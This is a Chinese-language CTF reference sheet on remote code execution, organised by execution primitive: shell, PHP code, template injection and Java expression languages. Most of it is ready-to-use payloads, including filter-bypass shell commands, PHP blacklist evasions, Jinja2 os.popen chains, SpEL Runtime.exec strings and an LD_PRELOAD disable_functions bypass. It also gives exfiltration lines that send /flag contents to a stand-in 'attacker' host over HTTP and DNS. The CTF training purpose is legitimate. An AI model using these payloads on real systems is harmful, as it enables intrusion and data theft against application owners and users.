---
title: RCE 判据库（从命令执行到表达式注入）
phase: webapp
vuln_class: [rce, command-injection, code-injection, ssti]
summary: RCE 题的第一问题不是「怎么绕过滤」，而是「我手上是什么执行原语」。本文按原语分四层（系统命令 / 语言代码 / 模板 / 表达式），每层给判据、绕法与失效条件。
---

# RCE 判据库

> 来源：`web/赛事专题/Writeup合集` 中 168 篇涉及 RCE 的 WP（744 条观测 / 461 条失败尝试）。
> 主库 `漏洞分类/注入类/` 已有 SSTI 与命令注入的细节，本文只补**主库没有的判据**，
> 特别是「同一现象该选哪一层原语」的判断。

## 0. 判据速查

| 现象 | 判据 | 去哪节 |
|---|---|---|
| 输入进了 `system`/`exec`/反引号 | 系统命令层，绕过滤即可 | §1 |
| 输入进了 `eval`/`assert`/`include` | 语言代码层，不需要 shell | §2 |
| 输入进了模板渲染 | 模板层，看引擎类型 | §3 |
| 输入进了 EL/SpEL/OGNL/QLExpress | 表达式层，看解析器 | §4 |
| 有命令执行但 `disable_functions` 挡了 | 换非函数路径（LD_PRELOAD/扩展/语言结构） | §5 |
| 能执行但无回显 | 外带（DNS/HTTP/写文件），不要死磕回显 | §6 |
| 能执行但出网被封 | 用本地回显技巧（`fastjson-local-echo` 类） | §6.2 |
| 只给一个长度极短的输入框 | 命令缩短术（`sort%09*`、`${IFS}`） | §1.3 |

## 1. 系统命令层

**判据**：输入被拼进 shell 命令行。特征是有 `;` `|` `&` `` ` `` `$()` 中任一能生效。

### 1.1 分隔符的选择

```text
;   顺序执行（前一条失败也继续）
|   管道（前一条的 stdout 喂给后一条）
||  前一条失败才执行后一条
&&  前一条成功才执行后一条
&   后台执行
`cmd`  反引号，等价 $()
$(cmd) 命令替换
%0a    换行，等价 ;
```

判据是**哪个没被过滤**。全被过滤时看 §1.2。

**坑**：`cmd.exe` 下 `&` 比 `;` 更稳，能跨单引号双引号触发（Windows 不把 `'` 当引号）。

### 1.2 空格被过滤

```bash
cat${IFS}/flag          # IFS 默认是空格+tab+换行
cat$IFS$9/flag          # $9 是空的位置参数，用来分隔
cat</flag               # 重定向当分隔
{cat,/flag}             # 花括号展开（bash only）
cat%09/flag             # tab
```

判据是**shell 是 bash 还是 sh**。`{cat,/flag}` 只有 bash 支持。

### 1.3 命令与文件名被过滤

| 目标 | 替代 |
|---|---|
| `cat` | `tac` `nl` `sort` `more` `less` `head` `tail` `od` `xxd` `base64` `rev` |
| `flag` | `fl*` `fla?` `/f*` `$IFS` 拼接 `a=fl;b=ag` |
| `/` | `${PATH:0:1}` `$(printf "\57")` `$(pwd -P | cut -c1)` |
| 长度限制 12 字符 | `sort%09*`（读当前目录全部文件）`nl%09*` |
| 全部关键字 | `$(rev<<<galf)` `$(echo galf|rev)` |

**判据**：长度限制题优先想「一次读多文件」，而不是「缩短单个命令」。

### 1.4 无回显的三种外带

```bash
# HTTP
curl http://attacker/$(cat /flag | base64 -w0)
wget http://attacker/$(cat /flag | base64 -w0)

# DNS（出网只开 53 时唯一的路）
ping -c1 `cat /flag | base64 -w0`.attacker.com
nslookup `cat /flag | base64 -w0`.attacker.com

# 写文件到 web 目录
cat /flag > /var/www/html/out.txt
cp /flag /tmp/x && chmod 644 /tmp/x
```

判据是**目标能出哪种协议**。HTTP 被封但 DNS 通的情况很常见。

## 2. 语言代码层

**判据**：输入进了 `eval`/`assert`/`create_function`/`include`，或模板外的代码拼接。

### 2.1 不需要 shell

```php
// eval 环境下直接读文件，不调任何命令
echo file_get_contents('/flag');
// 或
var_dump(scandir('/'));
```

判据是**有 eval 就别用 system**。`disable_functions` 通常只禁系统命令，不禁语言内置函数。

### 2.2 关键字黑名单的字面绕过

| 被禁 | 绕过 |
|---|---|
| `system` | `$f='sys'.'tem'; $f('id');`、`"\\x73ystem"`、`chr(115).chr(121)...` |
| `cat` | 同上，或 `\143\141\164`（八进制） |
| `_` | `\x5f`、`chr(95)`、`\137` |
| `flag` | `fl''ag`、`"fl\\x61g"` |
| `eval` | `assert`（PHP < 7）、`preg_replace` 带 `/e`（PHP < 7） |
| 所有字母数字 | 异或 `('__'^'..')`、自增 `++`、反引号 |

```php
// 无字母数字 RCE 的核心：两个非字母数字字符异或得到字母
$_ = ('@'^'!');        // 得到 'a'
// 或用自增
$_ = []; $_ = ++$_;    // 'A'
```

判据是**黑名单是按字符串匹配还是按语义**。字符串匹配一定能绕。

### 2.3 无参数 RCE

```php
// 能调函数但不能传参
?code=system(end(getallheaders()));   // 配 Header: cmd: id
?code=system(current(get_defined_vars())); // 取第一个变量
?code=print_r(scandir(current(localeconv()))); // 读当前目录
```

判据是**函数名可控但参数不可控**。`getallheaders()`/`get_defined_vars()`/`localeconv()` 是三个标准取值源。

## 3. 模板层（SSTI）

**判据**：输入被渲染进模板，且 `{{7*7}}` 返回 `49` 而不是字面量。

### 3.1 引擎识别

| 探测 | 返回 | 引擎 |
|---|---|---|
| `{{7*7}}` | `49` | Jinja2 / Twig / Nunjucks |
| `{{7*'7'}}` | `7777777` | Jinja2 |
| `{{7*'7'}}` | `49` | Twig |
| `${7*7}` | `49` | Freemarker / JSP EL |
| `#{7*7}` | `49` | Ruby ERB / Thymeleaf |
| `<%= 7*7 %>` | `49` | ERB / EJS |
| `${{7*7}}` | `49` | Velocity（老版本） |
| `@(7*7)` | `49` | Razor |

判据是**不同引擎的字符串乘法行为不同**，这是最可靠的区分点。

### 3.2 关键字被过滤

| 过滤 | 绕过 |
|---|---|
| `__class__` | `\u005f\u005fclass\u005f\u005f`（Jinja2 支持 unicode 转义） |
| `{{` | `{%if(...)|attr()%}1{%endif%}`、`{%print(...)%}` |
| `print` | 用 `{%if%}` 包裹 |
| `os`/`system` | `lipsum.__globals__['os']`、`cycler.next.__globals__.__builtins__.__import__('os')` |
| 全部关键字 | 字符串拼接 `''.__class__` → `''['__cl'+'ass__']` |

判据是**模板引擎是否解析字符串里的转义**。Jinja2 会，Twig 部分会。

### 3.3 盲注 SSTI

无回显时用时间：

```python
# 逐字符判定
{{ ''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['os'].popen('sleep 5').read() }}
# 或用条件 sleep
{% if 'flag' in open('/flag').read() %}...{% endif %}
```

判据是**能执行但看不到输出**。优先试 `sleep` 判定 RCE 成立，再逐字符取。

## 4. 表达式层

**判据**：Java 系应用里有 `${...}`、`#{...}`、`%{...}`、`[[${...}]]`。

| 引擎 | 触发 | 典型 payload |
|---|---|---|
| SpEL（Spring） | `[[${...}]]`（双层，单层常被转义） | `T(java.lang.Runtime).getRuntime().exec('id')` |
| OGNL（Struts2） | `%{...}` | `(#cmd='id').(#iswin=...).(#cmds=...)` |
| MVEL | `@{...}` | `Runtime.getRuntime().exec('id')` |
| QLExpress | `#{...}` 或直接表达式 | `java.lang.Runtime.getRuntime().exec('id')` |
| EL（JSP） | `${...}` | `${''.getClass().forName('java.lang.Runtime')...}` |

**关键判据**：SpEL 在 Spring 里常需要 `[[${...}]]` 双括号才能触发，单括号会被当文本。这是最容易踩的一点。

### 4.1 SpEL 无回显

`exec` 返回 `Process` 对象，不返回输出。必须：

```java
// 方式一：读 Process 的输入流
new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).next()
// 方式二：外带
T(java.lang.Runtime).getRuntime().exec('curl http://attacker/$(id|base64)')
```

判据是**表达式返回值的类型**。返回 `String` 才能直接看到，返回 `Process` 必须二次处理。

## 5. `disable_functions` 绕过

**判据**：`phpinfo()` 或报错里能看到 `disable_functions` 列表。

| 手法 | 前置 | 成功率 |
|---|---|---|
| LD_PRELOAD + `putenv` | `putenv` 未禁，能写 `.so` | 高 |
| `mail()` 第 5 参数 | `mail` 未禁 | 中 |
| `imap_open` | `imap` 扩展在 | 中 |
| `error_log` 写文件 | `error_log` 未禁 | 高 |
| FastCGI 打 php-fpm | 能连 9000 | 高 |
| `Apache mod_cgi` | 能写 `.htaccess` | 中 |
| `bash` 反弹 | `bash` 未禁 | 高 |
| 反序列化 + `__destruct` | 有链 | 看链 |

**核心判据**：`disable_functions` 只禁**函数**，不禁**语言结构**。`include`、`echo`、反引号、`${}`、`new` 全都不受影响。

### 5.1 LD_PRELOAD 的完整链路

```php
// 1. 写 .so 到可写目录（内容需 base64 解出来）
file_put_contents('/tmp/evil.so', base64_decode('...'));
// 2. 设置环境变量
putenv('LD_PRELOAD=/tmp/evil.so');
// 3. 触发一个会调用外部程序的函数
mail('a@b.c', 'x', 'y');
```

判据是**能写文件 + `putenv` 可用 + 有任一函数会 fork 子进程**。

## 6. 出网被封怎么办

### 6.1 先判「封在哪一层」

```text
DNS 也不通        → 完全隔离，只能本地回显
DNS 通 HTTP 不通  → 用 DNS 外带
HTTP 通但只允许特定域名 → 找该域名的跳板
出网全通          → 直接用 curl/wget
```

### 6.2 本地回显技巧

```text
Java: fastjson-local-echo（把结果写进异常信息）
Java: 把结果写进响应头（需要能改 response）
PHP: 写文件到 web 目录
Python: 把结果塞进报错栈
通用: 把结果写进数据库再读
```

判据是**应用本身有没有「回显通道」**——报错页、响应头、可读文件、可查的库。

## 7. 纪律

- **先判原语层级，再谈绕过**。有 `eval` 却去绕 `system` 的过滤是浪费。
- **能执行就先确认执行成功**（`sleep 5` / 写一个标记文件），再去取数据。不要一上来就 `cat /flag`。
- **无回显先想外带**，三条路（HTTP/DNS/写文件）任选，不要死磕回显。
- **`disable_functions` 绕不过就换 sink**。绕它成本高，往往不如找一个没被禁的入口。
- **SpEL 记得双括号**。单括号不触发是最高频的「以为没洞」误判。
- **模板引擎先探再打**。`{{7*'7'}}` 一个探测就能定引擎，省掉后面所有试错。
- **长度限制题想「一次读全部」**，不要想「缩短单个命令」。
